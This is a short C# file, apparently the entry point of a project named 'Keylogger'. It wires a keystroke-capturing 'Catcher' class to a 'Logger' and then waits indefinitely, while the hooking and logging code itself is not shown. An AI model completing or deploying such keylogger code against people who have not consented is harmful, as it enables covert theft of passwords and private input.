using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Keylogger
{
    class Program
    {
        static ManualResetEvent waitHandle = new ManualResetEvent(false);
        static void Main(string[] args)
        {
            Catcher catcher = new Catcher(20);
            Logger logger = new Logger();
            catcher.KeyDown += logger.KeyDown;
            catcher.KeyUp += logger.KeyUp;
            catcher.Start();           
            waitHandle.WaitOne();
        }

        
    }
}
